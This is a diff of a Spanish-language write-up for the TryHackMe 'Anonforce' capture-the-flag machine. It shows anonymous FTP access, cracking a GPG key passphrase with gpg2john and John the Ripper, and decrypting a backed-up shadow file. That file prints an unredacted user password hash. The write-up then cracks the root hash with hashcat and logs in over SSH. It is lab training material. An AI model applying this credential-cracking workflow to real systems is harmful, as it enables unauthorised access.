@@ -5,7 +5,7 @@ excerpt: "boot2root machine for FIT and bsides guatemala CTF"
 date: 2022-04-25
 classes: wide
 header:
-  teaser: /assets/images/thm-writeup-anonforce/anonforce_logo.jpeg
+  teaser: /assets/images/thm-writeup-anonforce/anonforce_logo.png
   teaser_home_page: true
   icon: /assets/images/thm_ico.png
 categories:
@@ -13,17 +13,19 @@ categories:
   - infosec
 tags:
   - Security
-  - Nodejs
-  - Deserialization
-  - web
+  - John
+  - Hash
+  - FTP
+  - SSH
 ---
 
-![logo](/assets/images/thm-writeup-anonforce/anonforce_logo.jpeg)
+![logo](/assets/images/thm-writeup-anonforce/anonforce_logo.png)
 
  [Link](https://tryhackme.com/room/bsidesgtanonforce "jason")
 
 boot2root machine for FIT and bsides guatemala CTF. Read user.txt and root.txt
 
+---
 
 ## 1. Fase de reconocimiento
 
@@ -59,24 +61,11 @@ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
 
 ![nmap](/assets/images/thm-writeup-anonforce/anonforce_nmap.png)
 
-- Escaneo de vulnerabilidades:
-
-~~~css
-nmap -v -A -sC -sV -Pn 10.10.24.236 -p- --script vuln -oN Vuln
-~~~
-
-~~~CSS
-
-                                                                     
-~~~
-
 ## 2.1 FTP
 
 - Conexión al protocolo FTP con el usuario anonymous:
   
----
-
-~~~CSS
+~~~css
 └─$ ftp anonymous@10.10.24.236
 Connected to 10.10.24.236.
 220 (vsFTPd 3.0.3)
@@ -120,7 +109,7 @@ lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmli
 
 - Accedemos a la carpeta **home** y dentro de esta a la carpeta **melodias**, dentro de esta última encotramos el archivo **user.txt**, el cual procedemos a descargar con el comando **get** como se observa a continuación:
 
-~~~CSS
+~~~css
 ftp> cd home
 250 Directory successfully changed.
 ftp> ls
@@ -146,7 +135,7 @@ local: user.txt remote: user.txt
 
 - Revisando encontramos una carpeta con el siguiente nombre muy llamativo: **notread**, procedemos a descargar su contenido como se oberva a continuación:
   
-~~~CSS
+~~~css
 ftp> cd notread
 250 Directory successfully changed.
 ftp> ls
@@ -175,16 +164,153 @@ local: private.asc remote: private.asc
   
 ![user_flag](/assets/images/thm-writeup-anonforce/anonforce_user.png)
 
-## 3 Bandera root
+---
+
+## 4 Bandera root
 
 - Analizando el archivo **private.asc** nos encotramos una llave privada:
 
 ![key](/assets/images/thm-writeup-anonforce/anonforce_key.png)
 
-<https://hashcat.net/wiki/doku.php?id=example_hashes>
+## 4.1 Extraer hashes de archivos encriptados con GnuPGP
+
+## 4.1.1 gpg2john
+
+- Utilizando **gpg2john** convertimos las llaves en un formato que JTR(john the ripper) pueda entender, en ese entendido utilizamos este comando como se observa a continuación:
+
+- Convertir ***backup.gpg***:
+  
+~~~css
+└─# gpg2john backup.pgp > back
+
+File backup.pgp
+	Encrypted data [sym alg is specified in pub-key encrypted session key]
+SYM_ALG_MODE_PUB_ENC is not supported yet!
+~~~
+
+- Convertir ***private.asc***:
+  
+~~~css
+└─# gpg2john private.asc > private
+
+File private.asc
+~~~
+
+---
+
+## 4.1.2 john private
+
+- Desciframos el archivo recien creado ***private*** con el sighiente comando:
+
+~~~css
+└─# john private                                                   
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 16 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+x????          (anonforce)     
+1g 0:00:00:00 DONE 2/3 (2022-04-25 19:56) 9.090g/s 144454p/s 144454c/s 144454C/s marisol..sweetness
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+~~~
+
+- Importamos la llave privada ***private.asc***
+
+~~~css
+└─# gpg --import private.asc      
+gpg: clave B92CD1F280AD82C2: clave pública "anonforce <melodias@anonforce.nsa>" importada
+gpg: clave B92CD1F280AD82C2: clave secreta importada
+gpg: clave B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" sin cambios
+gpg: Cantidad total procesada: 2
+gpg:               importadas: 1
+gpg:              sin cambios: 1
+gpg:       claves secretas leídas: 1
+gpg:   claves secretas importadas: 1
+~~~
+
+- Desciframos el contenido del archivo ***backup.pgp***, con este paso podemos ver el hash de la cueta ***root***
+
+~~~css
+└─# gpg --decrypt backup.pgp 
+~~~
+
+- Se carga la siguiente ventana en la que digitamos la contraseña encontrada en el punto **4.1.2**
+
+![key](/assets/images/thm-writeup-anonforce/anonforce_gpg1.png)
+
+- A continuación se ve el contenido del archivo:
+  
+~~~css
+gpg: NOTA: el cifrado CAST5 no aparece en las preferencias del receptor
+gpg: cifrado con clave de 512 bits ELG, ID AA6268D1E6612967, creada el 2019-08-12
+      "anonforce <melodias@anonforce.nsa>"
+root:$6$0??????????????????????????????????????????????????????????????????????:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18120:0:99999:7:::
+uuidd:*:18120:0:99999:7:::
+melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
+sshd:*:18120:0:99999:7:::
+ftp:*:18120:0:99999:7:::                                               
+~~~
+
+- Creaamos un archivo con el hash del usuario **root**, en nuestro caso lo nombramos **hash**.
+
+![hash_id](/assets/images/thm-writeup-anonforce/anonforce_hash1.png)
+
+- Procedemos a analizar la cabecera del hash en la siguiente página: <https://hashcat.net/wiki/doku.php?id=example_hashes> en la que se evidencia que el identificador del hash es: ***1800**
 
 ![hash_id](/assets/images/thm-writeup-anonforce/anonforce_hash_id.png)
 
+## 4.1.3 hashcat
 
+- Con la información anterior y usando **hashcat** procedemos a descifrar la contraseña para ingresar vís SSH:
 
+~~~css
+hashcat -m 1800 hash --force --wordlist /usr/share/wordlists/rockyou.txt
+~~~
 
+![hash_id](/assets/images/thm-writeup-anonforce/anonforce_hash2.png)
+
+## 4.1.4 Conexión vía ssh
+
+~~~css
+ssh root@10.10.24.236
+~~~
+
+![root](/assets/images/thm-writeup-anonforce/anonforce_root.png)
+
+---
+
+Fuentes:
+
+- Recover Your GPG Passphrase using 'John the Ripper': <https://www.ubuntuvibes.com/2012/10/recover-your-gpg-passphrase-using-john.html>
+
+- Generic hash types: <https://hashcat.net/wiki/doku.php?id=example_hashes>
